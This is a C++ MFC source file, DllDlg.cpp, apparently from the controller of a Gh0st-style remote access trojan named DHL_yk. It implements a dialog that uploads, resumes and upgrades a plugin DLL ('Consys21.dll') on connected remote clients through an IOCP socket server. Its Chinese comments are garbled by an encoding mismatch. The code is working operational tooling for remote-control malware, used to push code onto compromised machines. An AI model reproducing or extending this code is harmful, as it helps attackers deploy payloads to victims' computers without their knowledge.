// DllDlg.cpp : implementation file
//

#include "stdafx.h"
#include "DHL_yk.h"
#include "DllDlg.h"
#include "MainFrm.h"
#include "PcView.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

HINSTANCE hdll;
HANDLE hDllFile;
void*  MemDll;
int    SizeDll;
DWORD  BytesRead;

__int64	Bf_nCounter = 0;// ���ݼ�����  ���ڱȽ���
LONG	Bf_dwOffsetHigh = 0;
LONG	Bf_dwOffsetLow = 0;
/////////////////////////////////////////////////////////////////////////////

CString strFilePath = "Consys21.dll";  //���ܲ���ļ�����

enum
{
	COMMAND_FILE_DLLSIZE = 1,		// DLL�ϴ�ʱ���ļ���С
	COMMAND_FILE_DLLDATA,			// DLL�ϴ�ʱ���ļ�����
	COMMAND_FILE_DLLTODOWNLOAD,     // ��������DLL����
	TOKEN_DLLDATA_CONTINUE,			// DLL������������
	TOKEN_DLLDATA_SIZE              // ����DLL�ؼ��ļ���С
};


CDllDlg::CDllDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CDllDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CDllDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	ModifyStyleEx( WS_EX_APPWINDOW, 0 ); 

	char strSelf[MAX_PATH];
	//��ȡ������������·������
	GetModuleFileName(NULL, strSelf, sizeof(strSelf));  
	m_strOperatingPath = strSelf;
	
	//���Ӳ��;��
	m_strOperatingPath.Format("%s\\Control\\", m_strOperatingPath.Mid(0,m_strOperatingPath.ReverseFind('\\')));
	m_strOperatingFile = m_strOperatingPath + strFilePath;
}


void CDllDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDllDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	DDX_Control(pDX, IDC_DLLDLG_PROGRESS, m_dlldlg_progress);
	//}}AFX_DATA_MAP
}
void CDllDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_DLLDATA_CONTINUE:   //�����ļ�����
		SendFileData();
		break;
	case TOKEN_DLLDATA_SIZE:       //���·����ļ�����
		{
			FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
			m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);
			DWORD DLLType = (m_pContext->m_DeCompressionBuffer.GetBuffer(1)[8]);
			ShowProgress();  //������ʾ
			
			CString strdigs;
			strdigs.Format("������Ѿ����ڹ��ܲ��������Ϊ %dKB��\n��ѡ���������... ",(int)(m_nCounter / 1024));
			SetDlgItemText(IDC_DLLINUSE_NEWS,strdigs);   //
			
			GetDlgItem(IDC_DLLDATA_CONT)->EnableWindow(TRUE);
			GetDlgItem(IDC_DLLDATA_AGAIN)->EnableWindow(TRUE);
			
			if(DLLType == COMMAND_DLL_CONTINUE)     //�ؼ�����
			{
				if(m_nOperatingFileLength == m_nCounter)  //�ļ���С��� �˳�
					OnDllClose();
				else
					OnDllDataAgain();  //�����ϴ�
			}
			else if(DLLType == COMMAND_DLL_UPGRADE)  //�ؼ�����
			{
				OnDllDataAgain();
			}
		break;
		}
	default:
		// ���䷢���쳣����
		break;
	}
}

BEGIN_MESSAGE_MAP(CDllDlg, CDialog)
	//{{AFX_MSG_MAP(CDllDlg)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_DLLCLOSE, OnDllClose)
	ON_BN_CLICKED(IDC_DLLDATA_AGAIN,OnDllDataAgain)
	ON_BN_CLICKED(IDC_DLLDATA_CONT,OnDllDataCont)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDllDlg message handlers
BOOL CDllDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here

// 	HICON m_hIcon	= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICOS1));
// 	SetIcon(m_hIcon, TRUE);			// Set big icon
// 	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	str.Format("\\\\%s", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	m_dlldlg_progress.SetRange(0, 100);
	m_dlldlg_progress.SetPos(0);
	m_bIsStop=false;

	SendUploadJob(strFilePath);  //�ϴ����  �����ļ�����

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CDllDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default

	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}

int my_memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

#define	MAX_CONFIG_LEN	1024
LPCTSTR FindConfigString(char *strFileName, LPCTSTR lpString)
{
	char	*lpConfigString = NULL;
	DWORD	dwBytesRead = 0;
	
	HANDLE	hFile = CreateFile(strFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	
	SetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
	lpConfigString = new char[MAX_CONFIG_LEN];
	ReadFile(hFile, lpConfigString, MAX_CONFIG_LEN, &dwBytesRead, NULL);
	CloseHandle(hFile);
	
	int offset = my_memfind(lpConfigString, lpString, MAX_CONFIG_LEN, 0);
	if (offset == -1)
	{
		delete lpConfigString;
		return NULL;
	}
	else
	{
		return lpConfigString + offset;
	}
}

void CDllDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
}

void CDllDlg::SendFileData()
{

	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(dwOffsetLow, dwOffsetHigh);
	if(m_nCounter<0)   //���ݳ��� �����ϴ���������
	{
		m_nCounter = Bf_nCounter;
		dwOffsetHigh = Bf_dwOffsetHigh;
		dwOffsetLow = Bf_dwOffsetLow;
	}
	else
	{
		Bf_nCounter = m_nCounter;
		Bf_dwOffsetHigh = dwOffsetHigh;
		Bf_dwOffsetLow = dwOffsetLow;
	}

	ShowProgress(); //������ʾ

	if (m_nCounter == m_nOperatingFileLength || dwOffsetLow == -1 || m_bIsStop)
	{
		EndLocalUploadFile();  //�ļ�������� �رմ���
		return;
 	}

	HANDLE	hFile;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	
	DWORD	nNumberOfBytesToRead = MAX_RSEND_DATA - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_RSEND_DATA);
	// Token,  ��С��ƫ�ƣ�����
	lpBuffer[0] = COMMAND_FILE_DLLDATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	
	// ����ֵ
	bool	bRet = true;
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);
	
	
	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize, NULL);
	}
	LocalFree(lpBuffer);
}

void CDllDlg::ShowProgress()
{
	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}
	
	int	progress = (int)((float)(m_nCounter * 100) / m_nOperatingFileLength);
	m_dlldlg_progress.SetPos(progress);

	CString strdig;
	strdig.Format("%d%%",progress);
	SetDlgItemText(IDC_DLLDLG_PROGREBT,strdig);   //

	strdig.Format("%dKB",(int)(m_nCounter / 1024));
	SetDlgItemText(IDC_DLLDLG_REMOTE,strdig);   //
}

//�ļ�������� �رմ���
void CDllDlg::EndLocalUploadFile()
{
	Sleep(500);
	::SendMessage(m_hWnd,WM_CLOSE,0,0);

	return;
}

//�����ļ���С
BOOL CDllDlg::SendUploadJob(CString m_FilePats)
{
	
	DWORD	dwSizeHigh = NULL;
	DWORD	dwSizeLow = NULL;
	// 1 �ֽ�token, 8�ֽڴ�С, �ļ�����, '\0'
	HANDLE	hFile;

	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		char Path[MAX_PATH];
	    sprintf(Path, "���ؿؼ� %s δ�ҵ����޷��ϴ����!! ", m_FilePats);
	    MessageBox(Path,"��ʾ����", MB_OK | MB_ICONWARNING);
		::SendMessage(m_hWnd,WM_CLOSE,0,0);
		return FALSE;
	}

	unsigned long stspp = MAXDWORD;
	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (stspp+1)) + dwSizeLow;
	CloseHandle(hFile);

	CString strdig;
	strdig.Format("%dKB",(int)(m_nOperatingFileLength / 1024));
	SetDlgItemText(IDC_DLLDLG_LOCAL,strdig);   //

	// �������ݰ��������ļ�����
	int		nPacketSize = 9;//fileRemote.GetLength() + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = COMMAND_FILE_DLLSIZE;   
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize, NULL);
	
	LocalFree(bPacket);
	return TRUE;
}

void CDllDlg::OnDllClose() 
{
	// TODO: Add your control notification handler code here
	OnClose();
	OnOK();
}

//���������ϴ�
void CDllDlg::OnDllDataAgain()  
{
    CString strdigs = "����˹��ܲ���������ϴ���... ";
	SetDlgItemText(IDC_DLLINUSE_NEWS,strdigs);   //
	GetDlgItem(IDC_DLLDATA_CONT)->EnableWindow(NULL);
	GetDlgItem(IDC_DLLDATA_AGAIN)->EnableWindow(NULL);

	BYTE lpBuffer = COMMAND_FILE_DLLTODOWNLOAD;
	m_iocpServer->Send(m_pContext, &lpBuffer, 1, NULL);
}

//���ݼ����ϴ�
void CDllDlg::OnDllDataCont()
{
    CString strdigs = "����˹��ܲ���������ϴ���... ";
    SetDlgItemText(IDC_DLLINUSE_NEWS,strdigs);   //
	GetDlgItem(IDC_DLLDATA_CONT)->EnableWindow(NULL);
	GetDlgItem(IDC_DLLDATA_AGAIN)->EnableWindow(NULL);

	SendFileData();
}